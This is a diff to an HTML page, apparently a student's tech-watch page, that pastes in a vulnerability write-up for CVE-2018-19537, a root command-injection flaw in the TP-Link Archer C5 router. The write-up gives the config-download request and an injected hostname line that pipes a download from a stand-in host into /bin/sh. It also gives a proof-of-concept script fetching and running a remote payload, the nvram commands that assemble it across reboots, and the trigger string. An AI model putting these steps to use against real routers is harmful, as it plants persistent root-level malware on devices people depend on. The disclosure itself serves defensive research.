@@ -12,22 +12,198 @@
     </nav>
     <div id="container">
         <h1><!-- A remplacer par le titre de votre veille technologique --></h1>
-        <h2>Description : </h2>
-        <p><!-- A remplacer par la description de votre veille Technologique --></p>
-        <p><!-- A remplacer par la description de votre veille Technologique --></p>
-        <p><!-- A remplacer par la description de votre veille Technologique --></p>
-        <p><!-- A remplacer par la description de votre veille Technologique --></p>
-        <p><!-- A remplacer par la description de votre veille Technologique --></p>
-        <p><!-- A remplacer par la description de votre veille Technologique --></p>
-        <p><!-- A remplacer par la description de votre veille Technologique --></p>
-        <p><!-- A remplacer par la description de votre veille Technologique --></p>
-        <p><!-- A remplacer par la description de votre veille Technologique --></p>
-        <p><!-- A remplacer par la description de votre veille Technologique --></p>
-        <p><!-- A remplacer par la description de votre veille Technologique --></p>
-        <p><!-- A remplacer par la description de votre veille Technologique --></p>
-        <p><!-- Supprimer les lignes inutiles --></p>
+        <h2>Description : TP-Link ArcherC5 RCE</h2>
+        <article class="markdown-body entry-content container-lg" itemprop="text"><div class="markdown-heading" dir="auto"><h1 tabindex="-1" class="heading-element" dir="auto">TP-Link Archer C5 Authenticated RCE Through Malicious Configuration File Upload (CVE-2018-19537)</h1><a id="user-content-tp-link-archer-c5-authenticated-rce-through-malicious-configuration-file-upload-cve-2018-19537" class="anchor" aria-label="Permalink: TP-Link Archer C5 Authenticated RCE Through Malicious Configuration File Upload (CVE-2018-19537)" href="#tp-link-archer-c5-authenticated-rce-through-malicious-configuration-file-upload-cve-2018-19537"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+            <div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Description</h2><a id="user-content-description" class="anchor" aria-label="Permalink: Description" href="#description"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+            <p dir="auto">An authenticated remote code execution (RCE) vulnerability exists in all published firmware versions for the TP-Link Archer C5 router. By uploading a maliciously crafted configuration file, an attacker can inject OS commands that are run with root privileges.</p>
+            <p dir="auto">The Archer C5 router allows administrative users to save current configuration parameters to a file, and restore parameters from a file.
+            These parameters seem to be properly sanitized when a user tries to set them within the web GUI.
+            However, they are not properly sanitized when set from a configuration file.
+            In particular, we injected OS commands via the <code>wan_dyn_hostname 1 &lt;name&gt;</code> parameter within the uploaded configuration file.
+            Other parameters may also be vulnerable.</p>
+            <div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Methodology</h2><a id="user-content-methodology" class="anchor" aria-label="Permalink: Methodology" href="#methodology"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+            <p dir="auto">A valid configuration file can be downloaded from the “Backup &amp; Restore” menu in the router’s web GUI. The following HTTP request will download a backup of the router’s current configuration:</p>
+            <div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>GET /userRpm/config.bin HTTP/1.1
+            Host: 192.168.0.1
+            User-Agent: Mozilla/5.0 (X11; Linux ia64; rv:60.0) Foxfire/60.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Referer: http://192.168.0.1/userRpm/BakNRestoreRpm.htm
+            Cookie: Authorization=Basic%20YWRtaW46cGFzc3dvcmQ%3D
+            Connection: close
+            Upgrade-Insecure-Requests: 1
+            </code></pre><div class="zeroclipboard-container">
+                <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="GET /userRpm/config.bin HTTP/1.1
+            Host: 192.168.0.1
+            User-Agent: Mozilla/5.0 (X11; Linux ia64; rv:60.0) Foxfire/60.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Referer: http://192.168.0.1/userRpm/BakNRestoreRpm.htm
+            Cookie: Authorization=Basic%20YWRtaW46cGFzc3dvcmQ%3D
+            Connection: close
+            Upgrade-Insecure-Requests: 1" tabindex="0" role="button">
+                    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+                <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+            </svg>
+                    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+            </svg>
+                </clipboard-copy>
+                </div></div>
+            <p dir="auto">The response contains the file “config.bin”, which is the configuration file with which we will tamper.</p>
+            <p dir="auto">Configuration files are obfuscated by DES-encrypting them with a hard-coded key. This hard-coded key appears to be re-used across multiple TP-Link products. Credit to Matteo Croce for discovering this hard-coded key value. <a href="http://teknoraver.net/software/hacks/tplink/" rel="nofollow">http://teknoraver.net/software/hacks/tplink/</a></p>
+            <p dir="auto">Two simple python scripts are attached to encrypt and decrypt configuration files - “binify.py” and “unbinify.py” respectively. A decrypted configuration file will have parameters like these:</p>
+            <div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>wan_dns_auto 2 0
+            wan_dyn_mtu 1 1500
+            wan_dyn_mtu 2 0
+            wan_dyn_ucst 1 0
+            wan_dyn_ucst 2 0
+            wan_dyn_hostname 1 Archer_C5
+            wan_stc_ip 1 0.0.0.0
+            wan_stc_ip 2 0.0.0.0
+            wan_stc_msk 1 0.0.0.0
+            </code></pre><div class="zeroclipboard-container">
+                <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="wan_dns_auto 2 0
+            wan_dyn_mtu 1 1500
+            wan_dyn_mtu 2 0
+            wan_dyn_ucst 1 0
+            wan_dyn_ucst 2 0
+            wan_dyn_hostname 1 Archer_C5
+            wan_stc_ip 1 0.0.0.0
+            wan_stc_ip 2 0.0.0.0
+            wan_stc_msk 1 0.0.0.0" tabindex="0" role="button">
+                    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+                <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+            </svg>
+                    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+            </svg>
+                </clipboard-copy>
+                </div></div>
+            <p dir="auto">We can tamper with this decrypted configuration file by adding a malicious BusyBox command to the “wan_dyn_hostname” parameter, like so:</p>
+            <div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>wan_dyn_hostname 1 `wget -O - http://bad.url/hack | /bin/sh`
+            </code></pre><div class="zeroclipboard-container">
+                <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="wan_dyn_hostname 1 `wget -O - http://bad.url/hack | /bin/sh`" tabindex="0" role="button">
+                    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+                <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+            </svg>
+                    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+            </svg>
+                </clipboard-copy>
+                </div></div>
+            <p dir="auto">We then encrypt the new malicious configuration file and upload it via the web GUI. The router will automatically reboot. Early in the boot process, when the httpd program is run, our malicious BusyBox command is executed. The pseudocode of the relevant part of httpd is something like this:</p>
+            <div class="highlight highlight-source-c notranslate position-relative overflow-auto" dir="auto"><pre>    <span class="pl-smi">char</span> <span class="pl-s1">hostname</span>[<span class="pl-c1">64</span>];
+                <span class="pl-smi">char</span> <span class="pl-s1">to_run</span>[<span class="pl-c1">256</span>];
+                <span class="pl-en">memcpy</span>(<span class="pl-s1">hostname</span>, <span class="pl-s1">some_value_somewhere</span>, <span class="pl-c1">63</span>);
+                <span class="pl-en">snprintf</span>(<span class="pl-s1">to_run</span>, <span class="pl-c1">256</span>, <span class="pl-s">"udhcpc -h %s -i eth0"</span>, <span class="pl-s1">hostname</span>)
+                <span class="pl-en">system</span>(<span class="pl-s1">to_run</span>);
+                <span class="pl-c">// Continue setting up network interfaces and connectivity</span></pre><div class="zeroclipboard-container">
+                <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="    char hostname[64];
+                char to_run[256];
+                memcpy(hostname, some_value_somewhere, 63);
+                snprintf(to_run, 256, &quot;udhcpc -h %s -i eth0&quot;, hostname)
+                system(to_run);
+                // Continue setting up network interfaces and connectivity" tabindex="0" role="button">
+                    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+                <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+            </svg>
+                    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+            </svg>
+                </clipboard-copy>
+                </div></div>
+            <p dir="auto">There are several limitations to this exploit, even beyond the limitation of having to use BusyBox. The Dropbear SSH server and telnetd do not seem to work over the wireless lan, and the hostname is limited by the firmware to 63 characters. Exceeding this limit overwrites other settings, and breaks internet access. Furthermore, httpd must return from the system() call before it actually has any network connectivity (as the system() call we are exploiting is the one that requests our WAN IP), and the root filesystem is read-only. The above example malicious command would not work; httpd would fail to wget the url since it does not yet have internet access, it would return from the system() call, and then it would continue operating normally.</p>
+            <p dir="auto">So at this point we can run a 63 character BusyBox command, on a read-only filesystem, with no trivial way to make the program wait until it has finished setting up network connectivity before executing our command. We cannot simply tell it to sleep for a few minutes and then execute, because the system() call that we inject into is blocking execution.</p>
+            <p dir="auto">One thing that we can do, however, is start another instance of httpd at this point in execution. This instance of httpd will also run this system call, which leaves us in a loop that will continuously spawn more instances of httpd, but allow the parent httpd processes to continue executing and ultimately restore network connectivity. To avoid running out of memory, we terminate this loop by checking to see if our exploit has been downloaded.</p>
+            <div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Proof of Concept</h2><a id="user-content-proof-of-concept" class="anchor" aria-label="Permalink: Proof of Concept" href="#proof-of-concept"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+            <p dir="auto">Working within the above limitations, we came up with the following shell script, which grabs a file from the internet with wget and pipes it straight to /bin/sh.</p>
+            <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto"><pre>    <span class="pl-c1">cd</span> /tmp 
+                <span class="pl-k">if</span> [ <span class="pl-k">!</span> <span class="pl-k">-f</span> B ]<span class="pl-k">;</span> <span class="pl-k">then</span> 
+                    httpd <span class="pl-k">&amp;</span> 
+                    sleep 15
+                    wget http://jackdoan.com/B
+                    /bin/sh B
+                <span class="pl-k">fi</span></pre><div class="zeroclipboard-container">
+                <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="    cd /tmp 
+                if [ ! -f B ]; then 
+                    httpd &amp; 
+                    sleep 15
+                    wget http://jackdoan.com/B
+                    /bin/sh B
+                fi" tabindex="0" role="button">
+                    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+                <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+            </svg>
+                    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+            </svg>
+                </clipboard-copy>
+                </div></div>
+            <p dir="auto">Or, on one line, minified:</p>
+            <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto"><pre>    <span class="pl-c1">cd</span> /tmp<span class="pl-k">;</span> <span class="pl-k">if</span> [ <span class="pl-k">!</span> <span class="pl-k">-f</span> B ]<span class="pl-k">;</span> <span class="pl-k">then</span> (httpd <span class="pl-k">&amp;</span> sleep 15<span class="pl-k">;</span> wget http://jackdoan.com/B<span class="pl-k">;</span> /bin/sh B) <span class="pl-k">fi</span></pre><div class="zeroclipboard-container">
+                <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="    cd /tmp; if [ ! -f B ]; then (httpd &amp; sleep 15; wget http://jackdoan.com/B; /bin/sh B) fi" tabindex="0" role="button">
+                    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+                <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+            </svg>
+                    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+            </svg>
+                </clipboard-copy>
+                </div></div>
+            <p dir="auto">This script is an enormous 89 characters, so we need to upload it in chunks. But how? Uploading a command causes a reboot, and a reboot refreshes the state of the router. We realized that we could create our own NVRAM variable, and reference it in subsequent commands to build a command that we eventually run.</p>
+            <p dir="auto">We used the vulnerability to inject the following commands and build up an exploit:</p>
+            <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto"><pre>    <span class="pl-k">;</span> nvram <span class="pl-c1">set</span> <span class="pl-s"><span class="pl-pds">"</span>a=cd /tmp; if [ ! -f B ]; then (htt<span class="pl-pds">"</span></span><span class="pl-k">;</span>nvram commit
+                <span class="pl-k">;</span> nvram <span class="pl-c1">set</span> <span class="pl-s"><span class="pl-pds">"</span>a=<span class="pl-s"><span class="pl-pds">`</span>nvram get a<span class="pl-pds">`</span></span>pd &amp; sleep 15; wget<span class="pl-pds">"</span></span><span class="pl-k">;</span>nvram commit
+                <span class="pl-k">;</span> nvram <span class="pl-c1">set</span> <span class="pl-s"><span class="pl-pds">"</span>a=<span class="pl-s"><span class="pl-pds">`</span>nvram get a<span class="pl-pds">`</span></span> http://jackdoan.co<span class="pl-pds">"</span></span><span class="pl-k">;</span>nvram commit
+                <span class="pl-k">;</span> nvram <span class="pl-c1">set</span> <span class="pl-s"><span class="pl-pds">"</span>a=<span class="pl-s"><span class="pl-pds">`</span>nvram get a<span class="pl-pds">`</span></span>m/B; /bin/sh B) fi<span class="pl-pds">"</span></span><span class="pl-k">;</span> nvram commit</pre><div class="zeroclipboard-container">
+                <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="    ; nvram set &quot;a=cd /tmp; if [ ! -f B ]; then (htt&quot;;nvram commit
+                ; nvram set &quot;a=`nvram get a`pd &amp; sleep 15; wget&quot;;nvram commit
+                ; nvram set &quot;a=`nvram get a` http://jackdoan.co&quot;;nvram commit
+                ; nvram set &quot;a=`nvram get a`m/B; /bin/sh B) fi&quot;; nvram commit" tabindex="0" role="button">
+                    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+                <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+            </svg>
+                    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+            </svg>
+                </clipboard-copy>
+                </div></div>
+            <p dir="auto">And finally, trigger the exploit by setting the hostname to:</p>
+            <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto"><pre>    <span class="pl-k">;</span> udhcpc<span class="pl-k">;</span> nvram get a <span class="pl-k">|</span> /bin/sh <span class="pl-k">;</span></pre><div class="zeroclipboard-container">
+                <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="    ; udhcpc; nvram get a | /bin/sh ;" tabindex="0" role="button">
+                    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+                <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+            </svg>
+                    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+            </svg>
+                </clipboard-copy>
+                </div></div>
+            <p dir="auto">This script stored in the router’s NVRAM will be run on each boot, and the router will appear to continue working normally. The end result is that the router will reach out to the internet, download a file, and run it as root every time it boots.</p>
+            <div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Criticality Assessment</h2><a id="user-content-criticality-assessment" class="anchor" aria-label="Permalink: Criticality Assessment" href="#criticality-assessment"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+            <p dir="auto">As shown, this vulnerability can be exploited to cause the router to reach out over the internet, grab a payload, and run it with root privileges. Therefore there is high impact on confidentiality, integrity, and availability of the device.</p>
